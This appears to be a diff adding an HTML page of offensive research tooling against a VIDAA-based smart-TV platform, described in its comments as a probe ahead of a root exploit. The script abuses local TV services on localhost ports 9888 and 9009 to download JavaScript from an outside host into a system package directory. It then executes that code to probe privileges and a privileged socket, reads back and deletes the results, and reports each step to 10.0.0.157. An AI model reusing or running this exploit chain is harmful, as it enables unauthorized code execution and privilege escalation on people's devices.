@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>recon-superwatch</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 18px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 10px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
+</style>
+</head>
+<body>
+<div id="out"></div>
+<script>
+/*
+ * recon-superwatch.html — the last gating probe before the 100U7Q root arm.
+ *
+ * 1. start basic/fetcher over wss://localhost:9888
+ * 2. fetchFile launcher/recon-probe.js and launcher/recon-cleanup.js into
+ *    /APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/
+ * 3. POST /function/basic/fetch/reconprobe_v1 — the function reports
+ *    uid/gid/groups, process.arch + uname, stats and connects to
+ *    /var/run/superwatch_socket (read-only command 85), tests /var/local
+ *    write+unlink, deletes the two findings/05 markers, writes
+ *    /APPS/.recon_probe_result.json, unlinks itself
+ * 4. read the result file via hiutils.fileRead (array path)
+ * 5. POST /function/basic/fetch/reconcleanup_v1 — deletes the result file
+ *    and itself
+ *
+ * No install, no postinst, no reboot.
+ */
+(function () {
+  "use strict";
+
+  var OUT = document.getElementById("out");
+  var FALLBACK_BASE = "http://10.0.0.157:8770";
+  var BASE = /^https?:$/.test(location.protocol) ? location.origin : FALLBACK_BASE;
+  var FN_DIR = "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/";
+
+  var rep = {
+    started: new Date().toISOString(),
+    page: location.href,
+    ua: navigator.userAgent,
+    env: {},
+    serviceStart: [],
+    fnWrites: [],
+    invoke: [],
+    result: null,
+    cleanup: [],
+    finished: null
+  };
+
+  function trunc(s, n) {
+    s = String(s == null ? "" : s);
+    return s.length > n ? s.slice(0, n) + "…(" + s.length + ")" : s;
+  }
+  function js(v) { try { return trunc(JSON.stringify(v), 800); } catch (e) { return trunc(String(v), 800); } }
+  function line(t, c) {
+    var d = document.createElement("div");
+    d.textContent = t;
+    if (c) d.className = c;
+    OUT.appendChild(d);
+    window.scrollTo(0, document.body.scrollHeight);
+  }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+  function post(tag) {
+    var body = JSON.stringify({ tag: tag, at: new Date().toISOString(), report: rep });
+    try {
+      fetch(BASE + "/api/recon", {
+        method: "POST", headers: { "Content-Type": "application/json" }, body: body
+      }).catch(function () {
+        try { fetch(BASE + "/api/recon", { method: "POST", mode: "no-cors", body: body }); } catch (e) {}
+      });
+    } catch (e) {}
+  }
+
+  function detectEnv() {
+    rep.env.vowOS = typeof vowOS;
+    rep.env.vowOSService = (typeof vowOS !== "undefined" && vowOS && vowOS.service)
+      ? typeof vowOS.service.syncExecute : "(absent)";
+    rep.env.HiUtils_createRequest = typeof HiUtils_createRequest;
+    rep.env.WebSDK_createFileRequest = typeof WebSDK_createFileRequest;
+  }
+
+  function wsStart(scheme) {
+    return new Promise(function (resolve) {
+      var ws, done = false;
+      function fin(o) {
+        if (done) return;
+        done = true;
+        try { if (ws) ws.close(); } catch (e) {}
+        resolve(o);
+      }
+      try { ws = new WebSocket(scheme + "://localhost:9888"); }
+      catch (e) { return fin({ scheme: scheme, error: String(e) }); }
+      ws.onopen = function () {
+        try {
+          ws.send(JSON.stringify({
+            path: "phoenix://service/basic/fetcher", method: "start",
+            parameters: {}, session: 901, timeout: 10
+          }));
+        } catch (e) {}
+        setTimeout(function () { fin({ scheme: scheme, opened: true, sent: true }); }, 1400);
+      };
+      ws.onerror = function () { fin({ scheme: scheme, opened: false, error: "ws error" }); };
+      ws.onclose = function () { fin({ scheme: scheme, opened: false, error: "closed before open" }); };
+      setTimeout(function () { fin({ scheme: scheme, opened: false, error: "timeout" }); }, 6000);
+    });
+  }
+
+  function vow(svc, payload) {
+    if (typeof vowOS === "undefined" || !vowOS || !vowOS.service ||
+        typeof vowOS.service.syncExecute !== "function") {
+      return { skipped: "vowOS.service.syncExecute absent" };
+    }
+    try {
+      var r = vowOS.service.syncExecute(svc, payload);
+      return { ret: (r && typeof r === "object") ? r.ret : undefined,
+               msg: trunc(r && r.msg !== undefined ? r.msg : r, 600) };
+    } catch (e) { return { exc: String(e) }; }
+  }
+
+  function postSvc(base, svc, payload, ms) {
+    return new Promise(function (resolve) {
+      var ctrl = (typeof AbortController === "function") ? new AbortController() : null;
+      var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, ms || 6000);
+      function done(o) { clearTimeout(timer); resolve(o); }
+      try {
+        fetch(base + "/service/" + svc, {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "identifier": "" },
+          body: JSON.stringify(payload),
+          signal: ctrl ? ctrl.signal : undefined
+        }).then(function (r) {
+          r.text().then(function (t) { done({ status: r.status, text: trunc(t, 800) }); })
+                  .catch(function (e) { done({ status: r.status, textError: String(e) }); });
+        }).catch(function (e) {
+          done({ fetchError: e && e.name ? e.name + ": " + e.message : String(e) });
+        });
+      } catch (e) { done({ exc: String(e) }); }
+    });
+  }
+
+  function postFunction(base, name, payload, ms) {
+    return new Promise(function (resolve) {
+      var ctrl = (typeof AbortController === "function") ? new AbortController() : null;
+      var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, ms || 8000);
+      function done(o) { clearTimeout(timer); resolve(o); }
+      try {
+        fetch(base + "/function/basic/fetch/" + name, {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "identifier": "" },
+          body: JSON.stringify(payload || {}),
+          signal: ctrl ? ctrl.signal : undefined
+        }).then(function (r) {
+          r.text().then(function (t) { done({ status: r.status, text: trunc(t, 1200) }); })
+                  .catch(function (e) { done({ status: r.status, textError: String(e) }); });
+        }).catch(function (e) {
+          done({ fetchError: e && e.name ? e.name + ": " + e.message : String(e) });
+        });
+      } catch (e) { done({ exc: String(e) }); }
+    });
+  }
+
+  function isOk(r) {
+    if (!r) return false;
+    if (r.ret === true) return true;
+    if (typeof r.text === "string" && /"ret"\s*:\s*true/.test(r.text)) return true;
+    if (typeof r.msg === "string" && /"ret"\s*:\s*true/.test(r.msg)) return true;
+    return false;
+  }
+
+  async function writeFn(file, target) {
+    var args = { url: BASE + "/" + file, directory: target, permission: 420 };
+    var r = vow("basic/fetcher", { api: "fetchFile", args: JSON.stringify(args) });
+    if (!isOk(r)) {
+      r = await postSvc("https://localhost:9888", "basic/fetcher",
+        { api: "fetchFile", args: args });
+      if (!isOk(r)) {
+        r = await postSvc("http://localhost:9009", "basic/fetcher",
+          { api: "fetchFile", args: args });
+      }
+    }
+    return r;
+  }
+
+  async function readResult() {
+    var paths = [".recon_probe_result.json", "../APPS/.recon_probe_result.json"];
+    for (var i = 0; i < paths.length; i++) {
+      var r = vow("hiutils", { api: "fileRead", args: { mode: 6, path: [paths[i]] } });
+      if (isOk(r) && typeof r.msg === "string" && r.msg.indexOf("ran") !== -1) {
+        return { via: "vow-array:" + paths[i], text: r.msg };
+      }
+      var h = await postSvc("http://localhost:9009", "hiutils",
+        { api: "fileRead", args: { mode: 6, path: [paths[i]] } });
+      if (h && typeof h.text === "string" && h.text.indexOf("ran") !== -1) {
+        return { via: "http-9009-array:" + paths[i], text: h.text };
+      }
+    }
+    return { via: "none", text: null };
+  }
+
+  async function main() {
+    line("== alvidaa recon-superwatch ==", "hdr");
+    line(rep.ua);
+    detectEnv();
+    line("env: " + js(rep.env));
+    post("start");
+
+    line("-- start basic/fetcher --", "hdr");
+    var a = await wsStart("wss");
+    rep.serviceStart.push(a);
+    line("[" + (a.opened ? "OK" : "--") + "] wss 9888 -> " + js(a), a.opened ? "ok" : "warn");
+    if (!a.opened) {
+      var b = await wsStart("ws");
+      rep.serviceStart.push(b);
+      line("[" + (b.opened ? "OK" : "--") + "] ws 9888 -> " + js(b), b.opened ? "ok" : "err");
+    }
+    post("started");
+    await sleep(1200);
+
+    line("-- place probe functions --", "hdr");
+    var probePath = FN_DIR + "reconprobe_v1.js";
+    var cleanPath = FN_DIR + "reconcleanup_v1.js";
+    var w1 = await writeFn("recon-probe.js", probePath);
+    rep.fnWrites.push({ file: probePath, result: w1, ok: isOk(w1) });
+    line("[" + (isOk(w1) ? "OK" : "--") + "] probe fn -> " + js(w1), isOk(w1) ? "ok" : "err");
+    post("fn-write");
+    if (!isOk(w1)) { rep.finished = new Date().toISOString(); post("final"); return; }
+
+    var w2 = await writeFn("recon-cleanup.js", cleanPath);
+    rep.fnWrites.push({ file: cleanPath, result: w2, ok: isOk(w2) });
+    line("[" + (isOk(w2) ? "OK" : "--") + "] cleanup fn -> " + js(w2), isOk(w2) ? "ok" : "warn");
+    await sleep(800);
+
+    line("-- invoke probe --", "hdr");
+    var inv = await postFunction("https://localhost:9888", "reconprobe_v1", {});
+    if (inv && (inv.fetchError || inv.status >= 400)) {
+      inv = await postFunction("http://localhost:9009", "reconprobe_v1", {});
+    }
+    rep.invoke.push(inv);
+    line("[invoke] reconprobe_v1 -> " + js(inv), "warn");
+    post("invoked");
+
+    await sleep(1200);
+
+    line("-- read result --", "hdr");
+    rep.result = await readResult();
+    if (rep.result.text) {
+      line("[OK] result via " + rep.result.via, "ok");
+      line(trunc(rep.result.text, 2400));
+    } else {
+      line("[--] result file not readable", "err");
+    }
+    post("result");
+
+    line("-- cleanup --", "hdr");
+    var c1 = await postFunction("https://localhost:9888", "reconcleanup_v1", {});
+    if (c1 && (c1.fetchError || c1.status >= 400)) {
+      c1 = await postFunction("http://localhost:9009", "reconcleanup_v1", {});
+    }
+    rep.cleanup.push(c1);
+    line("[cleanup] reconcleanup_v1 -> " + js(c1), "warn");
+
+    rep.finished = new Date().toISOString();
+    post("final");
+    line("== done — screenshot this page ==", "hdr");
+  }
+
+  main().catch(function (e) {
+    line("FATAL " + String(e), "err");
+    rep.fatal = String(e);
+    post("fatal");
+  });
+})();
+</script>
+</body>
+</html>
